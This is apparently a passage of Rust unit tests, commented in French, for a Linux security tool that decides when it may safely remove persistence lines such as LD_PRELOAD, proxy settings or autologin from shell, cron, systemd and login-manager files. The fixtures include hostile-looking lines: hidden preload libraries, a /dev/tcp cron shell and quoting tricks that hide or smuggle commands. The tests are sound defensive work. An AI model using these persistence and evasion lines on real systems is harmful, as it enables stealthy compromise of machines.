    /// et après le retrait, script du rapport de la ronde 7) : la sortie change (« REVEILLEE », code de sortie,
    /// lecture arrêtée) ; ici, chacun est refusé.
    #[test]
    fn retrait_refuse_les_cas_de_la_ronde_7() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        let reveil = "[ ${#X} -gt 9 ] && return\necho REVEILLEE\n";
        for (contenu, n) in [
            // R7-1 : la ligne est du texte dans un guillemet que bash ouvre (fin de « $( », saut de page, « \r »,
            // « $$( », « ${x:-'} » en mode POSIX).
            (format!("X=$(true)#\"\n{p}\n\" #\"\n{reveil}"), 1),
            (format!("X=a\x0c#\"\n{p}\n\" #\"\n{reveil}"), 1),
            (format!("X=a\r#\"\n{p}\n\" #\"\n{reveil}"), 1),
            (format!("X=\"$$(\"'\")\"\n{p}\n'\\'\n{reveil}"), 1),
            (format!("X=\"${{x:-'}}\"'}}\"\n{p}\n'\\'\n{reveil}"), 1),
            // R7-2 : la ligne est deux éléments d'un tableau.
            (
                format!("a=(\nun\n{p}\ndeux\n)\n[ ${{#a[@]}} = 4 ] && return\necho REVEILLEE\n"),
                2,
            ),
            (
                format!("a=(un\n{p}\ndeux)\n[ ${{#a[@]}} = 4 ] && return\necho REVEILLEE\n"),
                1,
            ),
            // R7-3 : une affectation en lecture seule arrête la lecture (sh, set -e).
            ("UID=1 # LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 0),
            ("UID=LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 0),
            ("export EUID=LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 0),
            ("set -e\nPPID=LD_PRELOAD=/tmp/.x/a.so\necho REVEILLEE\n".to_string(), 1),
            ("UID=LD_PRELOAD=/tmp/.x/a.so\nA=b\n".to_string(), 0),
            // R7-4 : un alias sans le mot écrit seul.
            (format!("c=alias\n$c export=return\n{p}\necho REVEILLEE\n"), 2),
            (format!("BASH_ALIASES[export]=return\n{p}\necho REVEILLEE\n"), 1),
            // R7-5 : des lignes voisines lisent l'état laissé sans le nommer.
            (format!("false\n{p}\nreturn\n"), 1),
            (format!("{p}\nenv | grep -q ^LD_ && return\necho REVEILLEE\n"), 0),
            (
                format!("f() {{ [ ${{BASH_LINENO[0]}} = 4 ] && echo REVEILLEE; }}\n{p}\n:\nf\n"),
                1,
            ),
            ("OLDPWD=/tmp/.x/LD_PRELOAD\nA=b\n".to_string(), 0),
            ("GLOBSORT=-name\nexport LD_PRELOAD=/tmp/.x/a.so\n".to_string(), 0),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
    }

    /// Ronde 7 du lot 096 : la forme exacte des lignes d'un fichier qui admet un retrait. Hors de la forme, le fichier
    /// entier reste à la main, même si la ligne retirée, elle, est simple.
    #[test]
    fn retrait_refuse_hors_de_la_forme() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        for (contenu, n) in [
            // Sur la ligne retirée : guillemets doubles, morceaux mêlés, commentaire en fin de ligne, « \r », « ~ »,
            // « $ », guillemet simple non fermé, deux affectations, NOM en minuscules.
            ("export LD_PRELOAD=\"/tmp/.x/a.so\"\n".to_string(), 0),
            ("export LD_PRELOAD=/tmp/'.x'/a.so\n".to_string(), 0),
            (format!("{p} # signalée\n"), 0),
            (format!("{p}\r\n"), 0),
            ("export LD_PRELOAD=~/a.so\n".to_string(), 0),
            ("export LD_PRELOAD=$HOME/a.so\n".to_string(), 0),
            ("export LD_PRELOAD='/tmp/a.so\n".to_string(), 0),
            ("export LD_PRELOAD='/tmp/a\\'.so'\n".to_string(), 0),
            (format!("{p} A=b\n"), 0),
            ("ld_preload=/tmp/.x/a.so\n".to_string(), 0),
            // Un NOM qui commence par un chiffre (bash y voit une commande) ; un octet hors de la forme entre
            // guillemets simples.
            ("1LD_PRELOAD=/tmp/.x/a.so\n".to_string(), 0),
            (format!("9A=b\n{p}\n"), 1),
            ("export LD_PRELOAD='/tmp/a$b.so'\n".to_string(), 0),
            (format!("A='$(id)'\n{p}\n"), 1),
            ("path=/tmp/.x\nexport LD_PRELOAD=/tmp/.x/a.so\n".to_string(), 1),
            // Ailleurs dans le fichier : une commande, une ligne de saut de page, un « \r » seul, un octet NUL ou
            // hors UTF-8 dans un commentaire, une marque d'ordre des octets, une autre ligne hors de la forme.
            (format!("umask 077\n{p}\n"), 1),
            (format!("{p}\n\x0c\n"), 0),
            (format!("{p}\n\r\n"), 0),
            (format!("{p}\n# a\0b\n"), 0),
            (format!("\u{feff}A=b\n{p}\n"), 1),
            (format!("A=\"b\"\n{p}\n"), 1),
            (format!("A=b # note\n{p}\n"), 1),
            // Un NOM posé deux fois (même sous « export » d'un côté seulement).
            (format!("LD_PRELOAD=/usr/lib/x.so\n{p}\n"), 1),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?} ligne {n}"
            );
        }
        let mut hors_utf8 = format!("{p}\n# ").into_bytes();
        hors_utf8.extend_from_slice(b"\xff\n");
        assert_eq!(retrait_decoupe(sh, &hors_utf8, &[0]), Some(Decoupe::Shell));
        // Un commentaire fini par « \ » : systemd le joint à la ligne d'après.
        assert_eq!(
            retrait_decoupe(sh, format!("# a \\\n{p}\n").as_bytes(), &[1]),
            Some(Decoupe::Barre)
        );
        // zsh : « =commande » en tête de la valeur ou après « : » (EQUALS), commande absente = erreur qui arrête le
        // fichier. Témoins : « = » plus loin dans la valeur, ou entre guillemets simples.
        for (contenu, n) in [
            ("A==pasdecommande\n{p}\n", 1),
            ("A=/a:=pasdecommande\n{p}\n", 1),
            ("A=b\nLD_PRELOAD==ls\n", 1),
        ] {
            let contenu = contenu.replace("{p}", p);
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                Some(Decoupe::Shell),
                "{contenu:?}"
            );
        }
        for contenu in ["A=b=c\n{p}\n", "A='=ls'\n{p}\n", "A='/a:=b'\n{p}\n"] {
            let contenu = contenu.replace("{p}", p);
            assert_eq!(retrait_decoupe(sh, contenu.as_bytes(), &[1]), None, "{contenu:?}");
        }
        // fish ne lit pas « NOM=valeur » comme bash : un fichier .fish garde le geste à la main. Témoin : le même
        // contenu sous un autre nom.
        for fish in ["/etc/fish/config.fish", "/home/alice/.config/fish/conf.d/x.fish"] {
            assert_eq!(
                retrait_decoupe(fish, format!("{p}\n").as_bytes(), &[0]),
                Some(Decoupe::Shell),
                "{fish}"
            );
        }
        assert_eq!(
            retrait_decoupe("/etc/fish/x.sh", format!("{p}\n").as_bytes(), &[0]),
            None
        );
    }

    /// Ronde 7 du lot 096 : les témoins admis. Chacun rejoué avec bash et sh (script du rapport de la ronde 7) : même
    /// sortie, même code, même umask avant et après le retrait.
    #[test]
    fn retrait_admis_dans_un_fichier_d_affectations() {
        let p = "export LD_PRELOAD=/tmp/.x/a.so";
        let sh = "/etc/profile.d/x.sh";
        for (contenu, n) in [
            (format!("{p}\n"), 0),
            (p.to_string(), 0),
            (format!("# Ne pas toucher\n\nA=b\nexport C='d e'\n\t{p}  \nZ=\n"), 4),
            (
                "LD_PRELOAD=/tmp/.x/a.so:/tmp/.x/b.so\n# l'été, à la main\n".to_string(),
                0,
            ),
            ("export LD_PRELOAD=''\n".to_string(), 0),
            ("A=b\nexport LD_PRELOAD='/tmp/a b.so'\nC=d\n".to_string(), 1),
        ] {
            assert_eq!(
                retrait_decoupe(sh, contenu.as_bytes(), &[n]),
                None,
                "{contenu:?} ligne {n}"
            );
        }
        for nom in ["LD_PRELOAD", "LD_AUDIT", "CUDA_PATH", "A1_B"] {
            assert_eq!(juge_le_nom(nom), [None, None], "{nom}");
        }
    }

    /// Ronde 7 du lot 096 (R7-3) : UID, EUID, PPID sont en lecture seule dans bash (l'affectation échoue et arrête la
    /// lecture sous sh ou « set -e ») ; GID, EGID, USERNAME changent l'identité de zsh.
    #[test]
    fn retrait_refuse_uid_euid_ppid() {
        for nom in ["UID", "EUID", "PPID", "GID", "EGID", "USERNAME"] {
            assert_eq!(juge_le_nom(nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 7 du lot 096 : chaque variable que le shell lit, met ou garde lui-même fait refuser la ligne qui la pose.
    #[test]
    fn retrait_refuse_chaque_nom_du_shell() {
        let ecrits = [
            "IFS",
            "PATH",
            "ENV",
            "HOME",
            "OLDPWD",
            "GLOBSORT",
            "TMPPREFIX",
            "PS4",
            "LINENO",
            "FPATH",
            "_",
        ];
        for nom in NOMS_DU_SHELL
            .iter()
            .map(|n| String::from_utf8_lossy(n).into_owned())
            .chain(ecrits.iter().map(ToString::to_string))
            .chain(
                PREFIXES_DU_SHELL
                    .iter()
                    .map(|p| format!("{}X", String::from_utf8_lossy(p))),
            )
        {
            assert_eq!(juge_le_nom(&nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 7 du lot 096 : « LC_ » (la langue du shell : classes de caractères, découpe des mots).
    #[test]
    fn retrait_refuse_les_noms_lc() {
        for nom in ["LC_ALL", "LC_CTYPE", "LC_X"] {
            assert_eq!(juge_le_nom(nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 7 du lot 096 : « BASH_ » (BASH_ENV lancé par tout bash fils, BASH_ALIASES, BASH_XTRACEFD…).
    #[test]
    fn retrait_refuse_les_noms_bash() {
        for nom in ["BASH_ENV", "BASH_ALIASES", "BASH_X"] {
            assert_eq!(juge_le_nom(nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 7 du lot 096 : « SHELL » (SHELLOPTS en lecture seule, SHELL).
    #[test]
    fn retrait_refuse_les_noms_shell() {
        for nom in ["SHELLOPTS", "SHELL", "SHELLX"] {
            assert_eq!(juge_le_nom(nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 8 du lot 096 (N8-2, N8-3) : TERMCAP et TZ, que le shell lit lui-même (bash recharge le terminal ou le
    /// fuseau à l'affectation) ; KSHUID, KSHGID, KSHEGID, USER_ID, PGRP et KSH_VERSION, en lecture seule dans mksh
    /// (d'après son manuel, mksh n'est pas installé ici).
    #[test]
    fn retrait_refuse_termcap_tz_et_les_noms_de_mksh() {
        for nom in [
            "TERMCAP",
            "TZ",
            "KSHUID",
            "KSHGID",
            "KSHEGID",
            "USER_ID",
            "PGRP",
            "KSH_VERSION",
        ] {
            assert_eq!(juge_le_nom(nom), [Some(Decoupe::Shell); 2], "{nom}");
        }
    }

    /// Ronde 8 du lot 096 (N8-1) : pam_env de Linux-PAM 1.4.0 à 1.5.3 arrête la lecture de /etc/environment, sans
    /// erreur, à une ligne de 8 191 octets ou plus ; retirer la ligne longue, ou une ligne d'avant, réveillerait les
    /// suivantes. Une ligne de plus de `LIGNE_OCTETS_MAX` octets fait refuser tout retrait du fichier, quel que soit
    /// son lecteur ; à la borne, le retrait se juge.
    #[test]
    fn retrait_refuse_dans_un_fichier_a_ligne_longue() {
        let p = "LD_PRELOAD=/tmp/.x/a.so";
        let avec = |n: usize| format!("{p}\nA={}\nexport C=d\n", "b".repeat(n - 2));
        for f in ["/etc/environment", "/etc/profile.d/x.sh", "/etc/security/pam_env.conf"] {
            assert_eq!(retrait_decoupe(f, avec(LIGNE_OCTETS_MAX).as_bytes(), &[0]), None, "{f}");
            assert_eq!(
                retrait_decoupe(f, avec(LIGNE_OCTETS_MAX + 1).as_bytes(), &[0]),
                Some(Decoupe::Longue),
                "{f}"
            );
            assert_eq!(
                retrait_decoupe(f, avec(9000).as_bytes(), &[1]),
                Some(Decoupe::Longue),
                "{f}"
            );
        }
        let longue = format!("{p}{}\n", "a".repeat(LIGNE_OCTETS_MAX + 1 - p.len()));
        assert_eq!(
            retrait_decoupe("/etc/environment", longue.as_bytes(), &[0]),
            Some(Decoupe::Longue)
        );
        let gdm = format!(
            "[daemon]\nX={}\nAutomaticLoginEnable=true\n",
            "c".repeat(LIGNE_OCTETS_MAX)
        );
        assert_eq!(
            retrait_decoupe("/etc/gdm3/custom.conf", gdm.as_bytes(), &[2]),
            Some(Decoupe::Connexion)
        );
    }

    /// Ronde 8 du lot 096 (N8-3) : /etc/rc.local est lancé par le système, et sa ligne « #! » choisit son lecteur.
    /// Seuls sh et bash (essayés aux rondes 6 et 7), sans option ou avec la seule « -e » du rc.local de Debian,
    /// admettent un retrait ; tout autre interpréteur, une option de plus ou l'absence de « #! » le refusent. Un
    /// fichier lu par un shell (profile.d) ne regarde pas sa ligne « #! ».
    #[test]
    fn retrait_de_rc_local_selon_l_interprete() {
        let corps = "export LD_PRELOAD=/tmp/.x/a.so\nA=b\n";
        for f in ["/etc/rc.local", "/tmp/essai/etc/rc.local"] {
            for tete in [
                "#!/bin/sh",
                "#!/bin/sh -e",
                "#!/usr/bin/sh",
                "#!/bin/bash",
                "#!/usr/bin/bash",
                "#! /bin/bash  ",
                "#!/bin/sh\t-e",
            ] {
                let contenu = format!("{tete}\n{corps}");
                assert_eq!(retrait_decoupe(f, contenu.as_bytes(), &[1]), None, "{f} {tete:?}");
            }
            for tete in [
                "#!/usr/bin/python3",
                "#!/bin/zsh",
                "#!/bin/mksh",
                "#!/usr/bin/fish",
                "#!/usr/bin/env sh",
                "#!/bin/sh -x",
                "#!/bin/sh -e -u",
                "#!/bin/shx",
                "#!/bin/sh-e",
                "#!",
                "# /bin/sh",
                "",
            ] {
                let contenu = format!("{tete}\n{corps}");
                assert_eq!(
                    retrait_decoupe(f, contenu.as_bytes(), &[1]),
                    Some(Decoupe::Interprete),
                    "{f} {tete:?}"
                );
            }
            assert_eq!(
                retrait_decoupe(f, corps.as_bytes(), &[0]),
                Some(Decoupe::Interprete),
                "{f} sans #!"
            );
        }
        let python = format!("#!/usr/bin/python3\n{corps}");
        assert_eq!(retrait_decoupe("/etc/profile.d/x.sh", python.as_bytes(), &[1]), None);
        assert_eq!(retrait_decoupe("/etc/rc.local.d/x", python.as_bytes(), &[1]), None);
    }

    /// Ronde 9 du lot 096 (N9-1, N9-2) : dans une unité systemd (et ses .d/*.conf), un fichier de cron ou d'anacron,
    /// un raccourci .desktop, une ligne peut en retenir une autre quelle que soit sa forme : « ExecStartPre= » ou
    /// « ExecCondition= » qui échoue empêche « ExecStart= » ; « SHELL= » vers un chemin qui n'existe pas fait échouer
    /// les tâches de cron qui suivent. Vanguard n'y retire jamais une ligne lui-même, même de la forme que la ronde 8
    /// admettait (`Decoupe::Format`), au bilan comme au fils root (`retrait_refuse`). Les fichiers de la relecture.
    #[test]
    fn retrait_jamais_dans_les_unites_cron_et_raccourcis() {
        let unite = "/etc/systemd/system/aide.service";
        for (f, contenu, n) in [
            // N9-1 : la ligne qui retient, et ses semblables.
            (
                unite,
                "[Service]\nExecStartPre=/tmp/.x/garde\nExecStart=/usr/local/bin/aide --installer\n",
                1,
            ),
            (
                unite,
                "[Service]\nExecCondition=/tmp/.x/garde\nExecStart=/usr/local/bin/aide --installer\n",
                1,
            ),
            (
                unite,
                "[Service]\nUser=LD_PRELOAD\nExecStart=/usr/local/bin/aide --installer\n",
                1,
            ),
            (
                unite,
                "[Unit]\nConditionPathExists=/tmp/.x/LD_PRELOAD\n[Service]\nExecStart=/usr/local/bin/aide\n",
                1,
            ),
            (
                "/etc/systemd/system/aide.service.d/a.conf",
                "[Service]\nExecStartPre=/tmp/.x/garde\n",
                1,
            ),
            (
                "/etc/systemd/system/aide.socket",
                "[Socket]\nExecStartPre=/tmp/.x/garde\n",
                1,
            ),
            ("/etc/systemd/system/aide.timer", "[Timer]\nOnBootSec=1\n", 1),
            ("/etc/systemd/system/aide.path", "[Path]\nPathExists=/tmp/.x/a\n", 1),
            // Ce que la ronde 8 admettait.
            (unite, "[Unit]\nDescription=x\n[Service]\nExecStart=/tmp/.x/a\n", 3),
            (unite, "[Service]\nEnvironment=LD_PRELOAD=/tmp/.x/a.so\n", 1),
            (unite, "[Service]\nUnsetEnvironment=LD_PRELOAD\n", 1),
            // N9-2 : cron, les trois variables qui retiennent.
            (
                "/etc/cron.d/aide",
                "SHELL=/dev/tcp/198.51.100.7/443\n@reboot root /usr/local/bin/aide --installer\n",
                0,
            ),
            ("/etc/crontab", "PATH=/tmp/.x\n@reboot root aide --installer\n", 0),
            ("/etc/cron.d/aide", "HOME=/tmp/.x/rien\n@reboot root aide\n", 0),
            ("/etc/cron.d/aide", "* * * * * root /tmp/.x/a\n", 0),
            ("/etc/cron.d/aide", "LD_PRELOAD=/tmp/.x/a.so\n* * * * * root true\n", 0),
            (
                "/etc/anacrontab",
                "SHELL=/bin/sh\n1 5 cron.daily run-parts /etc/cron.daily\nLD_PRELOAD=/tmp/.x/a.so\n",
                2,
            ),
            ("/etc/anacrontab", "SHELL=/tmp/.x/LD_PRELOAD\n1 5 a true\n", 0),
            // Raccourcis.
            (
                "/etc/xdg/autostart/a.desktop",
                "[Desktop Entry]\nType=Application\nName=Agent\nExec=/tmp/.x/a\n",
                3,
            ),
            (
                "/etc/xdg/autostart/a.desktop",
                "[Desktop Entry]\nTryExec=/nonexistent/LD_PRELOAD\nExec=/usr/bin/aide\n",
                1,
            ),
            (
                "/etc/xdg/autostart/a.desktop",
                "[Desktop Entry]\nOnlyShowIn=LD_PRELOAD;\nExec=/usr/bin/aide\n",
                1,
            ),
            // Sous la racine d'un essai, le chemin se juge par sa fin.
            ("/tmp/essai/etc/cron.d/aide", "SHELL=/tmp/.x\n@reboot root aide\n", 0),
            (
                "/tmp/essai/etc/xdg/autostart/a.desktop",
                "[Desktop Entry]\nExec=/tmp/.x/a\n",
                1,
            ),
        ] {
            let ligne = contenu.split('\n').nth(n).unwrap_or_default();
            assert_eq!(
                retrait_refuse(f, contenu.as_bytes(), ligne.as_bytes(), &[n]),
                Some(Decoupe::Format),
                "{f} {contenu:?} ligne {n}"
            );
            assert_eq!(
                retrait_decoupe(f, contenu.as_bytes(), &[n]),
                Some(Decoupe::Format),
                "{f} {contenu:?} ligne {n}"
            );
        }
        // Même un fichier trop long pour être jugé, ou sans aucune ligne : la raison est le fichier.
        let trop = "\n".repeat(RETRAIT_LIGNES_MAX + 1);
        assert_eq!(retrait_refuse(unite, trop.as_bytes(), b"", &[0]), Some(Decoupe::Format));
    }

    /// Ronde 9 du lot 096 (N9-3, N9-4) : Vanguard ne retire lui-même que les lignes qu'il sait juger seul, la même
    /// règle au bilan et au fils root (`retrait_refuse`) : une affectation simple de LD_PRELOAD ou de LD_AUDIT qui
    /// précharge vraiment (ronde 10 : plus l'ouverture automatique d'une session, N10-3). Une ligne qui vide la
    /// variable (« LD_PRELOAD= ») ne précharge rien : la retirer n'enlève rien (N9-4).
    #[test]
    fn retrait_seulement_des_lignes_que_vanguard_retire() {
        let env = "/etc/environment";
        let sh = "/etc/profile.d/x.sh";
        let juge = |f: &str, contenu: &str, n: usize| {
            let ligne = contenu.split('\n').nth(n).unwrap_or_default();
            retrait_refuse(f, contenu.as_bytes(), ligne.as_bytes(), &[n])
        };
        for (f, contenu, n) in [
            (env, "A=b\nLD_PRELOAD=/tmp/.x/a.so\n", 1),
            (sh, "# note\nexport LD_AUDIT=/tmp/.x/a.so\n", 1),
            (sh, "export LD_PRELOAD='/tmp/.x/a.so'\n", 0),
        ] {
            assert_eq!(juge(f, contenu, n), None, "{f} {contenu:?} ligne {n}");
        }
        for (f, contenu, n) in [
            // N9-4 : neutres.
            (env, "LD_PRELOAD=\n", 0),
            (env, "LD_PRELOAD=  \n", 0),
            (sh, "export LD_PRELOAD=\n", 0),
            (sh, "export LD_AUDIT=\n", 0),
            (sh, "unset LD_PRELOAD\n", 0),
            // N9-3 : une autre variable, une commande, un commentaire, une ligne vide.
            (env, "FOO=LD_PRELOAD\n", 0),
            (sh, "export PYTHONPATH=/tmp/.x\n", 0),
            (sh, "export A=/tmp/.x/a\n", 0),
            (sh, "# export LD_PRELOAD=/tmp/.x/a.so\n", 0),
            (sh, "\n", 0),
            ("/etc/rc.local", "#!/bin/sh\n/tmp/.x/a\n", 1),
        ] {
            assert_eq!(juge(f, contenu, n), Some(Decoupe::Hors), "{f} {contenu:?} ligne {n}");
        }
        // Hors UTF-8 : la ligne ne se juge pas, refusée.
        assert_eq!(
            retrait_refuse(env, b"LD_PRELOAD=/tmp/\xff.so\n", b"LD_PRELOAD=/tmp/\xff.so", &[0]),
            Some(Decoupe::Hors)
        );
        // Un préchargement qui n'est pas une affectation simple : la forme le refuse (raison du shell), pas la ligne.
        assert_eq!(
            juge(sh, "export LD_PRELOAD=/tmp/.x/a.so; echo\n", 0),
            Some(Decoupe::Shell)
        );
        assert_eq!(juge(env, "LD_PRELOAD= /tmp/.x/a.so\n", 0), Some(Decoupe::Shell));
        // La ligne offerte, mais le fichier autour la lie : la raison du fichier.
        assert_eq!(
            juge(sh, "export LD_PRELOAD=/tmp/.x/a.so\necho fin\n", 0),
            Some(Decoupe::Shell)
        );
    }

    /// Ronde 10 du lot 096 (N10-3, N10-4) : dans un fichier de GDM, SDDM ou LightDM, Vanguard ne retire ni ne
    /// commente jamais une ligne lui-même, au bilan comme au fils root (`retrait_refuse`, `proxy_refuse`). La règle
    /// stricte des rondes 8 et 9 jugeait une ligne d'UN fichier comme GLib la lit ; SDDM n'est pas GLib (blancs
    /// Unicode ôtés autour d'une clé), et chacun lit plusieurs fichiers. Les cas de la relecture.
    #[test]
    fn jamais_de_retouche_dans_un_fichier_de_connexion() {
        for (f, contenu, n) in [
            // Ce que les rondes 8 et 9 retiraient seules.
            (
                "/etc/gdm3/custom.conf",
                "[daemon]\nAutomaticLoginEnable=true\nAutomaticLogin=alice\n",
                1,
            ),
            ("/etc/gdm/custom.conf", "[daemon]\nTimedLoginEnable=1\n", 1),
            ("/etc/gdm3/daemon.conf", "[daemon]\nAutomaticLoginEnable=true\n", 1),
            ("/etc/sddm.conf.d/a.conf", "[Autologin]\nUser=alice\nSession=x\n", 1),
            // N10-3 : un autre fichier pose « User=mallory », ou la même clé avec un espace insécable, ou
            // « TimedLoginEnable » reste indenté.
            ("/etc/sddm.conf", "[Autologin]\nUser=bob\n", 1),
            ("/etc/sddm.conf", "[Autologin]\nUser=bob\nUser\u{a0}=mallory\n", 1),
            (
                "/etc/gdm3/custom.conf",
                "[daemon]\nAutomaticLoginEnable=true\n  TimedLoginEnable=true\n",
                1,
            ),
            ("/etc/lightdm/lightdm.conf", "[Seat:*]\nautologin-user=alice\n", 1),
            (
                "/etc/lightdm/lightdm.conf.d/a.conf",
                "[Seat:*]\nautologin-user=alice\n",
                1,
            ),
            // N10-4 : SDDM lit tous les fichiers de ses dossiers, quel que soit leur nom.
            ("/etc/sddm.conf.d/a", "[Autologin]\nUser=alice\n", 1),
            ("/usr/lib/sddm/sddm.conf.d/a.conf", "[Autologin]\nUser=alice\n", 1),
            ("/tmp/essai/etc/sddm.conf.d/50-x", "[Autologin]\nUser=alice\n", 1),
            // Une ligne d'affectation simple n'y change rien : le fichier décide.
            ("/etc/gdm3/custom.conf", "LD_PRELOAD=/tmp/.x/a.so\n", 0),
            ("/etc/sddm.conf.d/a", "HTTP_PROXY=http://198.51.100.7:3128\n", 0),
        ] {
            let ligne = contenu.split('\n').nth(n).unwrap_or_default();
            for refus in [
                retrait_refuse(f, contenu.as_bytes(), ligne.as_bytes(), &[n]),
                proxy_refuse(f, contenu.as_bytes(), ligne.as_bytes(), &[n]),
                retrait_decoupe(f, contenu.as_bytes(), &[n]),
            ] {
                assert_eq!(refus, Some(Decoupe::Connexion), "{f} {contenu:?} ligne {n}");
            }
        }
        // Même un fichier trop long : la raison est le fichier.
        let trop = "\n".repeat(RETRAIT_LIGNES_MAX + 1);
        assert_eq!(
            proxy_refuse("/etc/sddm.conf", trop.as_bytes(), b"", &[0]),
            Some(Decoupe::Connexion)
        );
    }

    /// Ronde 10 du lot 096 (N10-1) : « mettre en commentaire une ligne de proxy » suit la règle du retrait, au bilan
    /// comme au fils root (`proxy_refuse`) : une ligne commentée est une ligne retirée pour son lecteur. Les cas de la
    /// relecture, une famille de fichier chacun.
    #[test]
    fn proxy_commente_selon_la_regle_du_retrait() {
        let juge = |f: &str, contenu: &str, n: usize| {
            let ligne = contenu.split('\n').nth(n).unwrap_or_default();
            let numeros: Vec<usize> = contenu
                .split('\n')
                .enumerate()
                .filter(|(_, l)| *l == ligne)
                .map(|(i, _)| i)
                .collect();
            proxy_refuse(f, contenu.as_bytes(), ligne.as_bytes(), &numeros)
        };
        let proxy = "HTTP_PROXY=http://198.51.100.7:3128";
        // Admis : une affectation simple en majuscules, dans un fichier d'affectations simples.
        for (f, contenu, n) in [
            ("/etc/environment", format!("EXEMPLE=1\n{proxy}\n"), 1),
            ("/etc/profile.d/proxy.sh", format!("# proxy\nexport {proxy}\n"), 1),
            (
                "/etc/environment.d/90-proxy.conf",
                "HTTPS_PROXY=http://198.51.100.7:3128\n".to_string(),
                0,
            ),
            (
                "/etc/profile.d/proxy.sh",
                "export ALL_PROXY='http://198.51.100.7:3128'\n".to_string(),
                0,
            ),
            ("/etc/rc.local", format!("#!/bin/sh\n{proxy}\n"), 1),
        ] {
            assert_eq!(juge(f, &contenu, n), None, "{f} {contenu:?} ligne {n}");
        }
        // a) Le guillemet ouvert de la relecture : la commande qu'il tient se lancerait.
        let quote = "export http_proxy='http://198.51.100.7:3128\n/tmp/.x/a &\n'\n";
        assert_eq!(juge("/etc/profile.d/a.sh", quote, 0), Some(Decoupe::Shell));
        let quote = "export HTTP_PROXY='http://198.51.100.7:3128\n/tmp/.x/a &\n'\n";
        assert_eq!(juge("/etc/profile.d/a.sh", quote, 0), Some(Decoupe::Shell));
        // Un heredoc dans /etc/profile.
        let heredoc = format!("cat > /dev/null <<'FIN'\n{proxy}\nFIN\n/tmp/.x/a &\n");
        assert_eq!(juge("/etc/profile", &heredoc, 1), Some(Decoupe::Shell));
        // Minuscules, guillemets doubles, autre fichier qui n'est pas simple : à la main.
        for (f, contenu, n) in [
            ("/etc/environment", "http_proxy=http://198.51.100.7:3128\n", 0),
            ("/etc/environment", "HTTP_PROXY=\"http://198.51.100.7:3128\"\n", 0),
            (
                "/etc/environment",
                "PATH=/usr/bin\nHTTP_PROXY=http://198.51.100.7:3128\n",
                1,
            ),
            (
                "/etc/profile.d/a.sh",
                "export HTTP_PROXY=http://198.51.100.7:3128\nexport HTTP_PROXY=http://198.51.100.7:3128\n",
                0,
            ),
        ] {
            assert_eq!(juge(f, contenu, n), Some(Decoupe::Shell), "{f} {contenu:?} ligne {n}");
        }
        // « \ » final : la ligne d'après changerait de sens.
        assert_eq!(
            juge("/etc/environment", &format!("{proxy} \\\nLD_PRELOAD=/tmp/.x/a.so\n"), 0),
            Some(Decoupe::Barre)
        );
        // b) Demandes forgées : unité (« \ » qui retient ExecStart), cron, anacron, .desktop.
        for (f, contenu, n) in [
            (
                "/etc/systemd/system/a.service",
                "[Service]\nEnvironment=http_proxy=x \\\nExecStart=/tmp/.x/a\n",
                1,
            ),
            (
                "/etc/systemd/system/a.service",
                "[Service]\nhttp_proxy=x \\\nExecStart=/tmp/.x/a\n",
                1,
            ),
            (
                "/etc/cron.d/x",
                "HTTP_PROXY=http://198.51.100.7:3128\n* * * * * root /tmp/.x/a\n",
                0,
            ),
            ("/etc/crontab", "http_proxy=x\n", 0),
            ("/etc/anacrontab", "HTTP_PROXY=x\n1 5 a /tmp/.x/a\n", 0),
            (
                "/etc/xdg/autostart/a.desktop",
                "[Desktop Entry]\nhttp_proxy=x\nExec=/tmp/.x/a\n",
                1,
            ),
        ] {
            assert_eq!(juge(f, contenu, n), Some(Decoupe::Format), "{f} {contenu:?} ligne {n}");
        }
        // /etc/ld.so.preload : le chargeur lit chaque mot comme une bibliothèque, jamais une ligne de proxy.
        assert_eq!(
            juge("/etc/ld.so.preload", &format!("{proxy}\n"), 0),
            Some(Decoupe::Hors)
        );
        // Une ligne qui ne règle pas le proxy, même désignée par ce geste ; un commentaire.
        for (f, contenu) in [
            ("/etc/environment", "LD_PRELOAD=/tmp/.x/a.so\n"),
            ("/etc/environment", "NO_PROXY=localhost\n"),
            ("/etc/profile.d/a.sh", "/tmp/.x/a &\n"),
            ("/etc/environment", "# HTTP_PROXY=http://198.51.100.7:3128\n"),
        ] {
            assert_eq!(juge(f, contenu, 0), Some(Decoupe::Hors), "{f} {contenu:?}");
        }
        // Et le retrait, lui, ne prend pas une ligne de proxy : chaque geste a ses lignes.
        assert_eq!(
            retrait_refuse(
                "/etc/environment",
                format!("{proxy}\n").as_bytes(),
                proxy.as_bytes(),
                &[0]
            ),
            Some(Decoupe::Hors)
        );
    }

    /// Sans lecture du Wi-Fi, la règle ne disparaît pas : sans carte, rien à juger ; avec une carte, non vérifié,
    /// jamais un silence.
    #[test]
    fn wifi_sans_lecture_jamais_muet() {
        use crate::modele::{Absence, Etat, Raison};
        let d = crate::essais::temporaire().join(format!("vanguard-sys-net-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&d);
        std::fs::create_dir_all(d.join("lo")).unwrap();
        std::fs::create_dir_all(d.join("enp3s0")).unwrap();
        assert_eq!(cartes_wifi(&d).ok(), Some(0));
        assert_eq!(wifi_sans_lecture(Ok(0), "x").etat(), Etat::SansObjet(Absence::Materiel));
        std::fs::create_dir_all(d.join("wlan0/wireless")).unwrap();
        std::fs::create_dir_all(d.join("wlp2s0/phy80211")).unwrap();
        assert_eq!(cartes_wifi(&d).ok(), Some(2));
        let c = wifi_sans_lecture(Ok(2), "le noyau refuse netlink");
        assert_eq!(
            c.etat(),
            Etat::NonVerifie(Raison::Illisible("le noyau refuse netlink".into()))
        );
